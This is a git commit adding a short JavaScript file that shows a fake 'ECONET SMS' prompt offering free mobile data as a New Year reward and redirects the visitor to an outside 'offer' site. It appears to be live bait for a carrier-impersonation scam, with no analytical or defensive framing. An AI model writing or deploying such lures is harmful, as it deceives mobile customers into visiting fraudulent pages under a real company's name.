2076d5e813cf33b2448c846a7d139ef4083c9fd6
ekpesense <abantak9@gmail.com>
2025-01-23 08:27:48 -0800

    Create econet-activation.js

---
+++ econet-activation.js
@@ -0,0 +1,5 @@
+var password = 'NEW YEAR GIFT'
+password=prompt('ECONET SMS: Dear ECONET Customer Kindly Receive Free Data From 5GB - 100GB, New Year Customers Reward, Click NEW YEAR GIFT To Check Now ','NEW YEAR GIFT');
+if (password != 'NEW YEAR GIFT') {
+location.href='https://offer-fest.info/econet.html';
+}
